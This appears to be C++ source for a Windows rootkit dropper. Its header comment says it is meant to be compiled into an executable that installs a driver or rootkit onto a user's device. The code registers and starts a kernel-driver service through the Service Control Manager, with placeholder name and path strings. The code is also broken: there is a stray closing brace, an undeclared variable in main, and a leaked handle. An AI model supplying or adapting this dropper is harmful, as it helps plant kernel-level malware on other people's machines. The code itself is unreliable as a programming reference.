/* 
Author: 0x44F
Use only for ethical purposes, this is meant to be compiled as an executable (exe) file to
drop the driver / rootkit into user device.
*/

#include <iostream>
#include <Windows.h>
#include <Winsvc.h>

SC_HANDLE installDriver(LPCTSTR driverName, LPCTSTR binPath)
{
	SC_HANDLE svcm_handle = NULL;
	SC_HANDLE svchandle = NULL;

	svcm_handle = OpenSCManager(NULL,NULL,SC_MANAGER_ALL_ACCESS);

	if(svcm_handle == NULL)
	{
		std::cout << "installdriver, could not open handle to SCM manager" << std::endl;
		return NULL;
	}

	svchandle = CreateService
		(
			svcm_handle,
			driverName,
			driverName,
			SERVICE_ALL_ACCESS,
			SERVICE_KERNEL_DRIVER,
			SERVICE_DEMAND_START,
			SERVICE_ERROR_NORMAL,
			binPath,
			NULL,
			NULL,
			NULL,
			NULL,
			NULL
		);

	if(svchandle == NULL)
	    return NULL;

	CloseServiceHandle(svcm_handle);
	return svchandle;
}

BOOL loadDriver(SC_HANDLE svchandle)
{
	if(StartService(svchandle,0,NULL) == 0)
		if(GetLastError() == ERROR_SERVICE_ALREADY_RUNNING)
		{
			return true;
		}

		else
		{
			return false;
		}
	}
}

int main(int argc, char *argv[])
{
    service_handle = installDriver("service name", "path to driver");
    loadDriver(service_handle);
    
    std::cout << "Loaded and installed driver.\r\n";
}
